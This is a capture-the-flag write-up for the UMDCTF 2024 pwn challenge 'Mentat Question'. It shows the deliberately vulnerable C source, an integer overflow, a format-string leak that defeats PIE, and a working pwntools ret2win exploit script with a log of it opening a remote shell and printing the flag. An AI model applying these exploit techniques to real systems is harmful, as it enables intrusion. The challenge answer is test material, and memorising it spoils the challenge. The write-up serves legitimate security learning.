---
linkTitle: Mentat Question
title: Mentat Question [Writeup]
type: docs
math: True
weight: 2
---
## Challenge Description

> Thufir Hawat is ready to answer any and all questions you have. Unless it's not about division...

## Challenge Files
```c {filename=mentat_question.c, linenos=table}
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

void secret() {
    system("/bin/sh");
}

uint32_t calculate(uint32_t num1, uint32_t num2) {
    printf("%i\n", num1);
    printf("%i\n", num2);

    char buf[16];

    if (num2 < 1) {
        puts("Oh, I was not aware we were using negative numbers!");
        puts("Would you like to try again?");
        gets(buf);
        if (strncmp(buf, "Yes", 3) == 0) {
            fputs("Was that a ", stdout);
            printf(buf);
            fputs(" I heard?\n", stdout);
            return 0;
        } else {
            puts("I understand. Apologies, young master.");
            exit(0);
        }
    }

    return num1 / num2;
}

int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    uint32_t num1;
    uint32_t num2;
    uint32_t res = 0;

    char buf[11];
    puts("Hello young master. What would you like today?");
    fgets(buf, sizeof(buf), stdin);

    if (strncmp(buf, "Division", 8) == 0) {
        puts("Of course");
        while (res == 0) {
            puts("Which numbers would you like divided?");
            fgets(buf, sizeof(buf), stdin);
            num1 = atoi(buf);

            fgets(buf, sizeof(buf), stdin);
            getc(stdin);
            if (strncmp(buf, "0", 1) == 0) {
                puts("I'm afraid I cannot divide by zero, young master.");
                return 1;
            } else {
                num2 = atoi(buf);
            }

            res = calculate(num1, num2);
        }
    }

    return 0;
}

```

## Solution 
Let us inspect the mitigations applied on the binary provided to us using the `checksec` command. 
```bash
fooker@fooker:~/ctfs/umdctf2024/mentat-question$ checksec mentat-question
[*] '~/ctfs/umdctf2024/mentat-question/mentat-question'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

As we can infer from the above snippet, the binary provided to us is a Position Independent Executable! Hence, we must somehow leak a known memory address in order to perform return oriented programming. 

### 32-bit Unsigned Integer Overflow
Upon inspecting the code we can immediately notice a buffer overflow vulnerability due to `gets()` at Line 19. However, we must figure out how to branch the execution flow to it. 

Notice that both `num1` and `num2` are 32-bit unsigned integers and we require `num2 < 1` for the desired branching, but we cannot have `num2 < 1` simultaneously. However, we could simply set `num2 = 32_BIT_INT_MAX + 1` and that would pass the checks required for gaining execution flow to the buffer overflow at Line 19!

### Format String Exploits to Leak Memory Addresses
Immediately following the buffer overflow at Line 19, we have a format string vulnerability at Line 22, where `printf()` is called upon our input string without any format specifiers! 

We could exploit this to leak any of the known memory addresses of our binary. I chose to leak the return address for the stack frame. This could be achieved as follows:

```bash
pwndbg> break *calculate + 204
Breakpoint 1 at 0x12bb
pwndbg> r
Starting program: ~/ctfs/umdctf2024/mentat-question/mentat-question
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Hello young master. What would you like today?
Division
Of course
Which numbers would you like divided?
1
4294967296
1
0
Oh, I was not aware we were using negative numbers!
Would you like to try again?
Yes %10$p %12$p
Was that a Yes 0x7fffffffd880 0x7fffffffdc09
Breakpoint 1, 0x00005555555552bb in calculate ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────
*RAX  0x21
 RBX  0x0
*RCX  0x7ffff7e96887 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x0
*RDI  0x7fffffffb5f0 —▸ 0x7ffff7de4050 (funlockfile) ◂— endbr64
*RSI  0x7fffffffb710 ◂— 'Yes 0x7fffffffd880 0x7fffffffdc09'
*R8   0x21
*R9   0x7fffffffdc09 ◂— 0x34365f363878 /* 'x86_64' */
 R10  0x0
*R11  0x246
*R12  0x7fffffffd998 —▸ 0x7fffffffdc1a ◂— '~/ctfs/umdctf2024/mentat-question/mentat-question'
*R13  0x55555555530b (main) ◂— push rbp
*R14  0x555555557dd8 —▸ 0x555555555180 ◂— endbr64
*R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
*RBP  0x7fffffffd850 —▸ 0x7fffffffd880 ◂— 0x1
*RSP  0x7fffffffd830 —▸ 0x55555555530b (main) ◂— push rbp
*RIP  0x5555555552bb (calculate+204) ◂— mov rax, qword ptr [rip + 0x2dbe]
────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────
 ► 0x5555555552bb <calculate+204>    mov    rax, qword ptr [rip + 0x2dbe] <stdout@GLIBC_2.2.5>
   0x5555555552c2 <calculate+211>    mov    rcx, rax
   0x5555555552c5 <calculate+214>    mov    edx, 0xa
   0x5555555552ca <calculate+219>    mov    esi, 1
   0x5555555552cf <calculate+224>    lea    rax, [rip + 0xda3]
   0x5555555552d6 <calculate+231>    mov    rdi, rax
   0x5555555552d9 <calculate+234>    call   fwrite@plt                <fwrite@plt>

   0x5555555552de <calculate+239>    mov    eax, 0
   0x5555555552e3 <calculate+244>    jmp    calculate+282                <calculate+282>

   0x5555555552e5 <calculate+246>    lea    rax, [rip + 0xd9c]
   0x5555555552ec <calculate+253>    mov    rdi, rax
─────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd830 —▸ 0x55555555530b (main) ◂— push rbp
01:0008│-018 0x7fffffffd838 ◂— 0x100000000
02:0010│-010 0x7fffffffd840 ◂— 'Yes %10$p %12$p'
03:0018│-008 0x7fffffffd848 ◂— 0x70243231252070 /* 'p %12$p' */
04:0020│ rbp 0x7fffffffd850 —▸ 0x7fffffffd880 ◂— 0x1
05:0028│+008 0x7fffffffd858 —▸ 0x55555555545c (main+337) ◂— mov dword ptr [rbp - 4], eax
06:0030│+010 0x7fffffffd860 —▸ 0x7fffffffdc09 ◂— 0x34365f363878 /* 'x86_64' */
07:0038│+018 0x7fffffffd868 ◂— 'd4294967296'
───────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────
 ► 0   0x5555555552bb calculate+204
   1   0x55555555545c main+337
   2   0x7ffff7dabd90 __libc_start_call_main+128
   3   0x7ffff7dabe40 __libc_start_main+128
   4   0x555555555105 _start+37
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>

```
I crafted a payload `Yes %10$p %12$p` and from the above snippet we could observe that these values correspond to the pointers at `[rbp]` and `[rbp + 0x10]`. Since, we know `[rbp + 0x08]` is just `(main + 337)`, hence we could leak this memory address to calculate the base address of our elf file. We also need the current base address of the executing binary which is easy to extract using `vmmap`.

```bash
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 ~/ctfs/umdctf2024/mentat-question/mentat-question
    0x555555555000     0x555555556000 r-xp     1000   1000 ~/ctfs/umdctf2024/mentat-question/mentat-question
    0x555555556000     0x555555557000 r--p     1000   2000 ~/ctfs/umdctf2024/mentat-question/mentat-question
    0x555555557000     0x555555558000 r--p     1000   2000 ~/ctfs/umdctf2024/mentat-question/mentat-question
    0x555555558000     0x555555559000 rw-p     1000   3000 ~/ctfs/umdctf2024/mentat-question/mentat-question
    0x7ffff7d7f000     0x7ffff7d82000 rw-p     3000      0 [anon_7ffff7d7f]
    0x7ffff7d82000     0x7ffff7daa000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7daa000     0x7ffff7f3f000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f3f000     0x7ffff7f97000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f97000     0x7ffff7f98000 ---p     1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f98000     0x7ffff7f9c000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f9c000     0x7ffff7f9e000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f9e000     0x7ffff7fab000 rw-p     d000      0 [anon_7ffff7f9e]
    0x7ffff7fbb000     0x7ffff7fbd000 rw-p     2000      0 [anon_7ffff7fbb]
    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000      0 [vvar]
    0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000      0 [vdso]
    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffdd000     0x7ffffffff000 rw-p    22000      0 [stack]
pwndbg>
```

We could now perform a buffer overflow in the next iteration and craft a `ret2win` to get a shell

### Buffer Overflow to ret2win
First we must know the offset of the buffer `char buf[16]` from the stack base pointer. I'll read a few bytes of visible garbage into the buffer and set a breakpoint right after the gets to examine the stack contents. 

```bash
Which numbers would you like divided?
1
4294967296
1
0
Oh, I was not aware we were using negative numbers!
Would you like to try again?
Yes AAAAAAAA
Was that a Yes AAAAAAAA
Breakpoint 1, 0x00005555555552bb in calculate ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────
*RAX  0xc
 RBX  0x0
 RCX  0x7ffff7e96887 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x0
 RDI  0x7fffffffb5f0 —▸ 0x7ffff7de4050 (funlockfile) ◂— endbr64
 RSI  0x7fffffffb710 ◂— 'Yes AAAAAAAAffd880 0x7fffffffdc09'
*R8   0xc
*R9   0x0
*R10  0x7fffffffd840 ◂— 'Yes AAAAAAAA'
 R11  0x246
 R12  0x7fffffffd998 —▸ 0x7fffffffdc1a ◂— '/home/fooker/ctfs/pwn/learn/exploitation-notebook/binary-exploitation/ctfs/umdctf2024/mentat-question/mentat-question'
 R13  0x55555555530b (main) ◂— push rbp
 R14  0x555555557dd8 —▸ 0x555555555180 ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 RBP  0x7fffffffd850 —▸ 0x7fffffffd880 ◂— 0x1
 RSP  0x7fffffffd830 —▸ 0x55555555530b (main) ◂— push rbp
 RIP  0x5555555552bb (calculate+204) ◂— mov rax, qword ptr [rip + 0x2dbe]
────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────
 ► 0x5555555552bb <calculate+204>    mov    rax, qword ptr [rip + 0x2dbe] <stdout@GLIBC_2.2.5>
   0x5555555552c2 <calculate+211>    mov    rcx, rax
   0x5555555552c5 <calculate+214>    mov    edx, 0xa
   0x5555555552ca <calculate+219>    mov    esi, 1
   0x5555555552cf <calculate+224>    lea    rax, [rip + 0xda3]
   0x5555555552d6 <calculate+231>    mov    rdi, rax
   0x5555555552d9 <calculate+234>    call   fwrite@plt                <fwrite@plt>

   0x5555555552de <calculate+239>    mov    eax, 0
   0x5555555552e3 <calculate+244>    jmp    calculate+282                <calculate+282>

   0x5555555552e5 <calculate+246>    lea    rax, [rip + 0xd9c]
   0x5555555552ec <calculate+253>    mov    rdi, rax
──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd830 —▸ 0x55555555530b (main) ◂— push rbp
01:0008│-018 0x7fffffffd838 ◂— 0x100000000
02:0010│ r10 0x7fffffffd840 ◂— 'Yes AAAAAAAA'
03:0018│-008 0x7fffffffd848 ◂— 0x7f0041414141 /* 'AAAA' */
04:0020│ rbp 0x7fffffffd850 —▸ 0x7fffffffd880 ◂— 0x1
05:0028│+008 0x7fffffffd858 —▸ 0x55555555545c (main+337) ◂— mov dword ptr [rbp - 4], eax
06:0030│+010 0x7fffffffd860 —▸ 0x7fffffffdc09 ◂— 0x34365f363878 /* 'x86_64' */
07:0038│+018 0x7fffffffd868 ◂— 'd4294967296'
────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────
 ► 0   0x5555555552bb calculate+204
   1   0x55555555545c main+337
   2   0x7ffff7dabd90 __libc_start_call_main+128
   3   0x7ffff7dabe40 __libc_start_main+128
   4   0x555555555105 _start+37
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>

```

It looks like the buffer is at an offset `0x10` from the base pointer. So we must write in the return address of the `secret()` function at an offset `0x18` in the buffer overflow payload. However, this doesnt seem to work as expected. Upon attaching gdb to the process and examining the execution flow, we observe a stack alignment issue! Hence, we must add an arbitrary `ret` instruction before the `secret()` return address in our payload. 

You can either use ROPgadget to add an arbitrary `ret` or use `pwn.ROP` to automate the rop gadget search process. I manually picked up a `ret` instruction. Here's the exploit!

```py {filename=exploit.py, linenos=table}
#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './mentat-question'
elf = context.binary = ELF(exe, checksec=True)
# libc = './lib/libc.so.6'
# libc = ELF(libc, checksec=False)

context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

host, port = 'challs.umdctf.io', 32300

def initialize(argv=[]):
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

r = initialize()
# =========================================================
#                         EXPLOITS
# =========================================================

first = False

def integer_overflow(first):
    if not first:
        r.sendlineafter(b"today?", b"Division")

    r.sendlineafter(b"divided?", b"1\n4294967296")
    return 

integer_overflow(first)
first = True

r.sendlineafter(b"again?", b"Yes %11$p")

r.recvuntil(b"Was that a Yes ")
main_leak = eval(r.recv(14))

elf.address = main_leak - (0x55555555545c - 0x555555554000)
integer_overflow(first)

payload = flat({
    0x00: b"Yes",
    0x18: p64(elf.address + 0x101a), 
    0x20: elf.sym['secret']
})

r.sendlineafter(b"again?", payload)
r.interactive()

```

and we get a shell on the remote machine!

```shell
fooker@fooker:~/ctfs/umdctf2024/mentat-question$ python3 exploit.py REMOTE
[*] '~/ctfs/umdctf2024/mentat-question/mentat-question'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challs.umdctf.io on port 32300: Done
[DEBUG] Received 0x2f bytes:
    b'Hello young master. What would you like today?\n'
[DEBUG] Sent 0x9 bytes:
    b'Division\n'
[DEBUG] Received 0x30 bytes:
    b'Of course\n'
    b'Which numbers would you like divided?\n'
[DEBUG] Sent 0xd bytes:
    b'1\n'
    b'4294967296\n'
[DEBUG] Received 0x55 bytes:
    b'1\n'
    b'0\n'
    b'Oh, I was not aware we were using negative numbers!\n'
    b'Would you like to try again?\n'
[DEBUG] Sent 0xa bytes:
    b'Yes %11$p\n'
[DEBUG] Received 0x4d bytes:
    b'Was that a Yes 0x5556d27b945c I heard?\n'
    b'Oh, I was not aware we were using negative numbers!\n'
    b'Would you like to try again?\n'
[DEBUG] Sent 0x29 bytes:
    00000000  59 65 73 61  62 61 61 61  63 61 61 61  64 61 61 61  │Yesa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  1a 90 7b d2  56 55 00 00  │eaaa│faaa│··{·│VU··│
    00000020  d9 91 7b d2  56 55 00 00  0a                        │··{·    b'Oh, I was not aware we were using negative numbers!\n'
    b'Would you like to try again?\n'
[DEBUG] Sent 0x29 bytes:
    00000000  59 65 73 61  62 61 61 61  63 61 61 61  64 61 61 61  │Yesa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  1a 90 7b d2  56 55 00 00  │eaaa│faaa│··{·│VU··│
    00000020  d9 91 7b d2  56 55 00 00  0a                        │··{·│VU··│·│
    00000029
[*] Switching to interactive mode

[DEBUG] Received 0x33 bytes:
    00000000  57 61 73 20  74 68 61 74  20 61 20 59  65 73 61 62  │Was │that│ a Y│esab│
    00000010  61 61 61 63  61 61 61 64  61 61 61 65  61 61 61 66  │aaac│aaad│aaae│aaaf│
    00000020  61 61 61 1a  90 7b d2 56  55 20 49 20  68 65 61 72  │aaa·│·{·V│U I │hear│
    00000030  64 3f 0a                                            │d?·│
    00000033
Was that a Yesabaaacaaadaaaeaaafaaa\x1a\x90{\xd2VU I heard?
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0xd bytes:
    b'flag.txt\n'
    b'run\n'
flag.txt
run
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x49 bytes:
    b'UMDCTF{3_6u1ld_n4v16470r5_4_7074l_0f_1.46_m1ll10n_62_50l4r15_r0und_7r1p}\n'
UMDCTF{3_6u1ld_n4v16470r5_4_7074l_0f_1.46_m1ll10n_62_50l4r15_r0und_7r1p}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to challs.umdctf.io port 32300

```
## Flag
```
UMDCTF{3_6u1ld_n4v16470r5_4_7074l_0f_1.46_m1ll10n_62_50l4r15_r0und_7r1p}
```
